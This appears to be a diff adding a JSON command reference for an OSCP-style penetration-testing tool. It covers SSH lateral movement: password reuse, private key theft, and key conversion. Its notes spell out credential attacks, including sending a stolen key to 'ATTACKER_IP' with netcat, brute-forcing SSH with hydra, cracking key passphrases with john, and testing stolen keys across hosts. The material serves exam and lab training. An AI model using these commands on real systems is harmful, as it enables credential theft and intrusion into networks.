@@ -1,0 +1,255 @@
+{
+  "category": "pivoting",
+  "subcategory": "ssh",
+  "description": "SSH connection, key authentication, and key format conversion commands for lateral movement",
+  "commands": [
+    {
+      "id": "ssh-connect-password",
+      "name": "SSH Connect with Password",
+      "category": "pivoting",
+      "subcategory": "ssh",
+      "command": "ssh <USER>@<TARGET>",
+      "description": "Connect to SSH server using password authentication for lateral movement or initial access",
+      "tags": [
+        "LATERAL_MOVEMENT",
+        "LINUX",
+        "OSCP:HIGH",
+        "PIVOTING",
+        "REMOTE_ACCESS",
+        "SSH"
+      ],
+      "variables": [
+        {
+          "name": "<USER>",
+          "description": "Username for SSH authentication",
+          "example": "admin",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target SSH server IP address or hostname",
+          "example": "10.10.11.18",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Password prompt appears",
+        "Login successful",
+        "Shell prompt from target system",
+        "Last login information displayed"
+      ],
+      "failure_indicators": [
+        "Connection refused (port 22 closed)",
+        "Connection timed out (firewall blocking)",
+        "Permission denied (wrong password/username)",
+        "Host key verification failed"
+      ],
+      "next_steps": [
+        "pty-spawn-script",
+        "linux-enumerate-users",
+        "check-sudo-privs"
+      ],
+      "alternatives": [
+        "ssh-key-authentication",
+        "sshpass -p '<PASSWORD>' ssh <USER>@<TARGET>"
+      ],
+      "prerequisites": [
+        "nmap-service-scan"
+      ],
+      "troubleshooting": {
+        "host_key_verification_failed": "Remove old key: ssh-keygen -R <TARGET>. Or bypass (INSECURE): ssh -o StrictHostKeyChecking=no <USER>@<TARGET>",
+        "permission_denied": "Verify username exists: Check /etc/passwd from previous foothold. Try default users: root, admin, administrator. Check password is correct",
+        "connection_refused": "SSH service not running or port filtered. Verify with nmap: nmap -p 22 <TARGET>. Try alternate port: ssh -p <PORT> <USER>@<TARGET>",
+        "password_prompt_doesnt_appear": "Server may require key authentication only. Check /etc/ssh/sshd_config for PasswordAuthentication setting",
+        "connection_hangs": "Network/firewall issue. Try verbose mode: ssh -v <USER>@<TARGET> to diagnose connection steps"
+      },
+      "notes": "CRITICAL OSCP LATERAL MOVEMENT: Password reuse across services is common.\n\nSSH password authentication workflow:\n1. Enumerate SSH service: nmap -p 22 <TARGET>\n2. Identify valid users: From /etc/passwd, web app, LDAP\n3. Test credentials: From database dumps, config files, previous shells\n4. Connect: ssh <USER>@<TARGET>\n5. Upgrade shell: Usually not needed (SSH provides full PTY)\n6. Enumerate: sudo -l, id, groups\n\nCommon OSCP scenarios:\n(1) Database credentials work on SSH\n    → Dump MySQL user table, test passwords\n\n(2) Web application credentials work on SSH\n    → Admin panel passwords often reused\n\n(3) Credentials found in config files\n    → .env, config.php, database.yml\n\n(4) Default credentials\n    → root:root, admin:admin, user:user\n\nManual verification before SSH:\n# Verify SSH service running\nnmap -p 22 -sV <TARGET>\n\n# Check SSH banner for version\nnc <TARGET> 22\n\n# Verify user exists (if you have shell)\ngrep <USER> /etc/passwd\n\nSSH flags for OSCP:\n-p <PORT>  - Alternate SSH port\n-v         - Verbose (debug connection issues)\n-4         - Force IPv4 (avoid IPv6 issues)\n-o StrictHostKeyChecking=no - Bypass host key verification (exam machines)\n-o UserKnownHostsFile=/dev/null - Don't save host key\n\nPassword reuse attack vectors:\n(1) Web app → SSH (most common)\n(2) Database → SSH\n(3) FTP → SSH\n(4) SMB → SSH (Windows/Linux hybrid networks)\n(5) User → Root (su with found password)\n\nAlternatives:\nsshpass -p 'password123' ssh user@target - Non-interactive password entry\nhydra -l user -P passwords.txt ssh://target - Password spraying\nmedusa -h target -u user -P passwords.txt -M ssh - Alternative brute force\n\nOSCP exam tip: ALWAYS test found credentials on SSH immediately. Document all credential pairs in credentials.txt. Common pattern: Web admin password = SSH user password.\n\nTime estimate: 30 seconds (connection) + 0-5 minutes (troubleshooting)",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ssh-key-authentication",
+      "name": "SSH Connect with Private Key",
+      "category": "pivoting",
+      "subcategory": "ssh",
+      "command": "chmod 600 <KEY_FILE> && ssh -i <KEY_FILE> <USER>@<TARGET>",
+      "description": "Connect to SSH server using private key authentication after extracting id_rsa from target system",
+      "tags": [
+        "LATERAL_MOVEMENT",
+        "LINUX",
+        "OSCP:HIGH",
+        "PIVOTING",
+        "REMOTE_ACCESS",
+        "SSH"
+      ],
+      "variables": [
+        {
+          "name": "<KEY_FILE>",
+          "description": "Path to private SSH key file (id_rsa, id_ecdsa, id_ed25519)",
+          "example": "id_rsa",
+          "required": true
+        },
+        {
+          "name": "<USER>",
+          "description": "Username for SSH authentication (key owner)",
+          "example": "admin",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target SSH server IP address or hostname",
+          "example": "10.10.11.18",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "chmod 600": "Set restrictive permissions on private key - SSH requires key file to be readable only by owner (not group/other). Without this, SSH will refuse to use the key with 'WARNING: UNPROTECTED PRIVATE KEY FILE' error",
+        "-i": "Specify identity file (private key) - tells SSH to use this key instead of default ~/.ssh/id_rsa for authentication"
+      },
+      "success_indicators": [
+        "Login successful without password prompt",
+        "Shell prompt from target system",
+        "Last login information displayed",
+        "No 'WARNING: UNPROTECTED PRIVATE KEY FILE' error"
+      ],
+      "failure_indicators": [
+        "WARNING: UNPROTECTED PRIVATE KEY FILE (permissions too open)",
+        "Permission denied (publickey) - key not authorized",
+        "Load key: invalid format - key file corrupted or wrong format",
+        "Enter passphrase for key - key is encrypted with passphrase"
+      ],
+      "next_steps": [
+        "linux-enumerate-users",
+        "check-sudo-privs",
+        "extract-ssh-key"
+      ],
+      "alternatives": [
+        "ssh-copy-id -i <KEY_FILE>.pub <USER>@<TARGET>",
+        "eval $(ssh-agent) && ssh-add <KEY_FILE> && ssh <USER>@<TARGET>"
+      ],
+      "prerequisites": [
+        "extract-ssh-key",
+        "ssh-key-format"
+      ],
+      "troubleshooting": {
+        "permissions_too_open": "Fix permissions: chmod 600 <KEY_FILE>. SSH requires private keys to be readable only by owner (not group or world)",
+        "publickey_denied": "Key not in authorized_keys on target. Verify: cat ~/.ssh/authorized_keys on target should contain public key matching private key. May need to add manually",
+        "invalid_format": "Key may need conversion. OpenSSH format required. Convert with: ssh-keygen -p -m PEM -f <KEY_FILE>. Or wrong key type - ensure private key not public key (.pub)",
+        "passphrase_required": "Key is encrypted. Crack passphrase: ssh2john <KEY_FILE> > hash.txt && john hash.txt. Or use different key. Or try empty passphrase (press Enter)",
+        "connection_refused": "SSH port closed or filtered. Verify with: nmap -p 22 <TARGET>"
+      },
+      "notes": "HIGH-VALUE OSCP TECHNIQUE: SSH key theft for lateral movement.\n\nSSH key authentication workflow:\n1. Find private key on compromised system\n   → Common locations: ~/.ssh/id_rsa, /home/*/.ssh/id_rsa, /root/.ssh/id_rsa\n\n2. Extract key to attacker machine\n   → Method 1: cat id_rsa (copy/paste)\n   → Method 2: Base64 encode: base64 -w0 id_rsa (copy), base64 -d > id_rsa (paste)\n   → Method 3: HTTP server: python3 -m http.server 8000, wget from attacker\n\n3. Fix key format if needed (see ssh-key-format)\n   → Check format: head -1 id_rsa\n   → If \"BEGIN OPENSSH PRIVATE KEY\": Good, use directly\n   → If \"BEGIN RSA PRIVATE KEY\": Good, use directly\n   → If encrypted: Crack with ssh2john\n\n4. Set correct permissions (CRITICAL)\n   → chmod 600 id_rsa\n   → SSH will refuse to use key with wrong permissions\n\n5. Connect with key\n   → ssh -i id_rsa <USER>@<TARGET>\n   → Username often matches key owner: ls -l /home/*/.ssh/id_rsa\n\n6. Enumerate privileges\n   → sudo -l, id, groups\n\nCommon OSCP scenarios:\n(1) Key found in web directory\n    → /var/www/.ssh/id_rsa (web user)\n\n(2) Key found in user home\n    → /home/admin/.ssh/id_rsa (admin user)\n\n(3) Key found in backup\n    → /opt/backups/id_rsa, /tmp/id_rsa.bak\n\n(4) Key in Git repository\n    → .git/config, .git/ssh/, accidentally committed\n\n(5) Multiple keys for different users\n    → Test each key against all known users\n\nKey permissions explained:\n600 (rw-------) - Owner read/write only (REQUIRED for private keys)\n644 (rw-r--r--) - Too permissive, SSH will reject\n700 (rwx------) - Directory permissions for .ssh/\n\nFinding SSH keys on target:\n# Find all private keys\nfind / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null\n\n# Find all .ssh directories\nfind / -type d -name '.ssh' 2>/dev/null\n\n# Check current user's keys\nls -la ~/.ssh/\n\n# Check all users' keys (if readable)\nfind /home -name 'id_*' 2>/dev/null\n\nTesting key against multiple users:\nfor user in root admin user1 user2; do\n  echo \"Testing $user\"\n  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@target && echo \"SUCCESS: $user\" && break\ndone\n\nAdvanced flags:\n-o BatchMode=yes - Don't prompt for passphrase (fail if encrypted)\n-o StrictHostKeyChecking=no - Bypass host key verification\n-o UserKnownHostsFile=/dev/null - Don't save host key\n-v - Verbose (debug authentication issues)\n\nOSCP exam tip: ALWAYS check ~/.ssh/id_rsa immediately after gaining shell. If found, extract immediately. Test against all known users. Document in breakthrough.md if successful.\n\nTime estimate: 1-2 minutes (key extraction) + 30 seconds (connection)",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "extract-ssh-key",
+      "name": "Extract SSH Private Key",
+      "category": "pivoting",
+      "subcategory": "ssh",
+      "command": "cat ~/.ssh/id_rsa",
+      "description": "Extract SSH private key from compromised system for lateral movement via key authentication",
+      "tags": [
+        "CREDENTIAL_ACCESS",
+        "FILE_DISCOVERY",
+        "LATERAL_MOVEMENT",
+        "LINUX",
+        "OSCP:HIGH",
+        "PIVOTING",
+        "SSH"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "-----BEGIN RSA PRIVATE KEY----- header visible",
+        "-----BEGIN OPENSSH PRIVATE KEY----- header visible",
+        "Base64-encoded key material displayed",
+        "-----END RSA PRIVATE KEY----- footer visible"
+      ],
+      "failure_indicators": [
+        "No such file or directory (key doesn't exist)",
+        "Permission denied (can't read key)",
+        "Empty file (key deleted or corrupted)",
+        "Proc-Type: 4,ENCRYPTED (passphrase protected)"
+      ],
+      "next_steps": [
+        "ssh-key-format",
+        "ssh-key-authentication"
+      ],
+      "alternatives": [
+        "cat /home/<USER>/.ssh/id_rsa",
+        "cat /root/.ssh/id_rsa",
+        "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null"
+      ],
+      "prerequisites": [
+        "linux-enumerate-home-directory",
+        "pty-spawn-script"
+      ],
+      "troubleshooting": {
+        "file_not_found": "Key may not exist for current user. Search other locations: find /home -name 'id_*' 2>/dev/null. Check /root/.ssh/ if root access. Try alternate key types: id_dsa, id_ecdsa, id_ed25519",
+        "permission_denied": "Can't read key (normal security). Try world-readable keys: find / -name 'id_rsa' -readable 2>/dev/null. Or escalate privileges first",
+        "key_encrypted": "If 'Proc-Type: 4,ENCRYPTED' in header, key requires passphrase. Crack with: ssh2john id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt",
+        "extraction_method": "Copy/paste from terminal. Or base64 encode: base64 -w0 ~/.ssh/id_rsa (cleaner for transfer). Or setup HTTP server: python3 -m http.server 8000, wget from attacker"
+      },
+      "notes": "CRITICAL OSCP TECHNIQUE: SSH key theft enables passwordless lateral movement.\n\nSSH private key locations (in order of likelihood):\n(1) ~/.ssh/id_rsa - Current user's default RSA key\n(2) ~/.ssh/id_ecdsa - Current user's ECDSA key (newer)\n(3) ~/.ssh/id_ed25519 - Current user's Ed25519 key (newest)\n(4) /home/<USER>/.ssh/id_rsa - Other users' keys (if readable)\n(5) /root/.ssh/id_rsa - Root user's key (requires root access)\n(6) /var/www/.ssh/id_rsa - Web user's key\n(7) Backup locations: /tmp/id_rsa, /opt/backups/, .git/\n\nKey extraction workflow:\n1. Enumerate users: cat /etc/passwd | grep /bin/bash\n2. Check current user's key: ls -la ~/.ssh/\n3. Extract current user's key (THIS COMMAND)\n4. Search for other users' keys:\n   find /home -name 'id_rsa' -readable 2>/dev/null\n5. Transfer key to attacker machine\n6. Format key if needed (ssh-key-format)\n7. Set permissions: chmod 600 id_rsa\n8. Test key: ssh -i id_rsa <USER>@<TARGET>\n\nKey format identification:\n# RSA private key (older format, widely compatible)\n-----BEGIN RSA PRIVATE KEY-----\n\n# OpenSSH private key (newer format, OpenSSH 7.8+)\n-----BEGIN OPENSSH PRIVATE KEY-----\n\n# Encrypted private key (requires passphrase)\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,...\n\nKey transfer methods:\nMethod 1: Copy/paste (small keys)\n- Cat key on target, copy output\n- Paste into file on attacker: nano id_rsa\n- Set permissions: chmod 600 id_rsa\n\nMethod 2: Base64 encoding (cleaner, no formatting issues)\n- On target: base64 -w0 ~/.ssh/id_rsa\n- Copy base64 string\n- On attacker: echo '<BASE64>' | base64 -d > id_rsa\n- Set permissions: chmod 600 id_rsa\n\nMethod 3: HTTP server (large keys, multiple files)\n- On target: cd ~/.ssh && python3 -m http.server 8000\n- On attacker: wget http://target:8000/id_rsa\n- Set permissions: chmod 600 id_rsa\n\nMethod 4: Netcat transfer\n- On attacker: nc -lvnp 9001 > id_rsa\n- On target: nc ATTACKER_IP 9001 < ~/.ssh/id_rsa\n- Set permissions: chmod 600 id_rsa\n\nCommon OSCP scenarios:\n(1) Web user has SSH key for database server\n    → Pivot from web shell to database server\n\n(2) User has SSH key for internal network\n    → Lateral movement to internal machines\n\n(3) Backup script contains SSH keys\n    → /opt/backup.sh, /usr/local/bin/sync.sh\n\n(4) Git repository with committed keys (mistake)\n    → git log --all --full-history -- '*.ssh/*'\n\n(5) Keys in world-readable locations (misconfiguration)\n    → find / -name 'id_*' -perm -004 2>/dev/null\n\nPublic key verification:\nEvery private key has corresponding public key (.pub)\nTo verify key ownership:\n1. Extract public key from private: ssh-keygen -y -f id_rsa\n2. Compare with ~/.ssh/id_rsa.pub on target\n3. Check authorized_keys: cat ~/.ssh/authorized_keys (shows where key grants access)\n\nTesting extracted key:\n# Test key against user it was found under\nssh -i id_rsa <USER>@<TARGET>\n\n# Test key against all enumerated users\nfor user in $(cat users.txt); do\n  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@<TARGET> 2>/dev/null && echo \"SUCCESS: $user\"\ndone\n\n# Test key against multiple targets (key reuse)\nfor ip in $(cat targets.txt); do\n  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 <USER>@$ip 2>/dev/null && echo \"SUCCESS: $ip\"\ndone\n\nAdvanced enumeration:\n# Find all SSH-related files\nfind ~/.ssh -type f 2>/dev/null\n\n# Check SSH config for key locations\ncat ~/.ssh/config 2>/dev/null | grep IdentityFile\n\n# Search bash history for SSH commands\ncat ~/.bash_history | grep 'ssh\\|scp\\|id_rsa'\n\nOSCP exam tip: Check for SSH keys IMMEDIATELY after shell upgrade. Priority locations: current user's ~/.ssh/, then /home/*/.ssh/. If found, extract and test against all known IPs/users. Document in breakthrough.md.\n\nTime estimate: 1-2 minutes (search + extraction) + 30 seconds per transfer method",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ssh-key-format",
+      "name": "Convert SSH Key Format",
+      "category": "pivoting",
+      "subcategory": "ssh",
+      "command": "ssh-keygen -p -m PEM -f <KEY_FILE>",
+      "description": "Convert SSH private key to PEM format for compatibility when key format causes authentication failures",
+      "tags": [
+        "LATERAL_MOVEMENT",
+        "OSCP:MEDIUM",
+        "PIVOTING",
+        "SSH",
+        "TROUBLESHOOTING"
+      ],
+      "variables": [
+        {
+          "name": "<KEY_FILE>",
+          "description": "Path to SSH private key file to convert",
+          "example": "id_rsa",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-p": "Change passphrase - in this case, we're using it to trigger format conversion without changing the passphrase (press Enter when prompted to keep existing passphrase or no passphrase)",
+        "-m PEM": "Specify output format as PEM (RFC 4716) - older, more compatible format. Converts from newer OpenSSH format if needed. Essential for compatibility with older SSH implementations",
+        "-f": "Specify key file to operate on - the private key file that needs format conversion"
+      },
+      "success_indicators": [
+        "Your identification has been saved with the new passphrase",
+        "Key format converted successfully",
+        "File header changes to -----BEGIN RSA PRIVATE KEY-----",
+        "Key now works with ssh -i"
+      ],
+      "failure_indicators": [
+        "Load key: invalid format",
+        "Failed to load key",
+        "Permissions 0644 too open (fix with chmod 600)",
+        "File not found"
+      ],
+      "next_steps": [
+        "ssh-key-authentication"
+      ],
+      "alternatives": [
+        "ssh-keygen -p -N '' -m pem -f <KEY_FILE>",
+        "openssl rsa -in <KEY_FILE> -out <KEY_FILE>.pem"
+      ],
+      "prerequisites": [
+        "extract-ssh-key"
+      ],
+      "troubleshooting": {
+        "invalid_format": "Key file corrupted. Verify header: head -1 <KEY_FILE> should show -----BEGIN. Re-extract from target",
+        "permissions_error": "Fix permissions first: chmod 600 <KEY_FILE>, then retry conversion",
+        "passphrase_prompt": "If key is encrypted, you need original passphrase to convert. If unknown, crack with: ssh2john <KEY_FILE> > hash.txt && john hash.txt",
+        "still_not_working": "Try removing passphrase entirely: ssh-keygen -p -N '' -f <KEY_FILE>. Or test with verbose SSH: ssh -v -i <KEY_FILE> <USER>@<TARGET> to see detailed error"
+      },
+      "notes": "SSH KEY FORMAT TROUBLESHOOTING: Modern OpenSSH keys may fail on older systems.\n\nSSH key format evolution:\n(1) PEM format (RFC 4716) - Older, widely compatible\n    Header: -----BEGIN RSA PRIVATE KEY-----\n    Used by: OpenSSH < 7.8, most tools\n    Compatibility: Excellent\n\n(2) OpenSSH format - Newer, better security\n    Header: -----BEGIN OPENSSH PRIVATE KEY-----\n    Used by: OpenSSH >= 7.8 (default since 2018)\n    Compatibility: May fail on older systems\n\nWhen format conversion needed:\n(1) \"Load key: invalid format\" error during SSH\n(2) Key extracted from newer OpenSSH system, using on older system\n(3) Key needs to work with non-OpenSSH tools (PuTTY, WinSCP)\n(4) Key format not recognized by ssh command\n\nFormat conversion workflow:\n1. Extract key from target (extract-ssh-key)\n2. Check format: head -1 id_rsa\n3. If \"OPENSSH PRIVATE KEY\" and SSH fails:\n   → Convert to PEM (THIS COMMAND)\n4. If \"RSA PRIVATE KEY\":\n   → Already PEM format, issue is elsewhere\n5. Set correct permissions: chmod 600 id_rsa\n6. Test: ssh -i id_rsa <USER>@<TARGET>\n\nCommand walkthrough:\nssh-keygen -p -m PEM -f id_rsa\n1. Prompts: \"Enter old passphrase:\" - Press Enter (if no passphrase) or enter passphrase\n2. Prompts: \"Enter new passphrase:\" - Press Enter (keep no passphrase) or set new one\n3. Prompts: \"Enter same passphrase again:\" - Press Enter or confirm\n4. Output: \"Your identification has been saved with the new passphrase\"\n5. Result: Key now in PEM format\n\nAlternative methods:\nMethod 1: ssh-keygen with empty passphrase\nssh-keygen -p -N '' -m pem -f id_rsa\n→ No prompts, sets empty passphrase automatically\n\nMethod 2: OpenSSL conversion\nopenssl rsa -in id_rsa -out id_rsa.pem\n→ Uses OpenSSL instead of ssh-keygen\n→ May handle corrupted keys better\n\nMethod 3: PuTTYgen (Windows)\nputtygen id_rsa -O private-openssh -o id_rsa.pem\n→ For converting to PuTTY format (PPK) or vice versa\n\nVerifying key format after conversion:\n# Check header\nhead -1 id_rsa\n# Should show: -----BEGIN RSA PRIVATE KEY-----\n\n# Verify key is valid\nssh-keygen -y -f id_rsa\n# Should output public key without errors\n\n# Test authentication\nssh -v -i id_rsa <USER>@<TARGET>\n# Verbose mode shows authentication details\n\nCommon OSCP scenarios:\n(1) Key extracted from Ubuntu 20.04+ (OpenSSH 8.x)\n    → Kali uses older OpenSSH version\n    → Conversion needed\n\n(2) Key from Windows OpenSSH\n    → May be in different format\n    → Convert to PEM for Linux compatibility\n\n(3) Key works on target, fails on Kali\n    → Format mismatch between SSH versions\n    → Convert to universal PEM format\n\nRemove passphrase from encrypted key:\n# If you have the passphrase\nssh-keygen -p -N '' -f id_rsa\n→ Enter old passphrase when prompted\n→ Press Enter for new passphrase (empty)\n→ Key now usable without passphrase\n\n# If you don't have passphrase\nssh2john id_rsa > hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n→ Crack passphrase with John the Ripper\n→ Then remove passphrase with above command\n\nOSCP exam tip: If extracted SSH key fails with \"invalid format\", immediately try format conversion. Pre-practice: ssh-keygen -p -m PEM -f id_rsa. Keep this command in your notes. Usually not needed but critical when it is.\n\nTime estimate: 30 seconds (conversion) + 0-5 minutes (troubleshooting)",
+      "oscp_relevance": "medium"
+    }
+  ]
+}
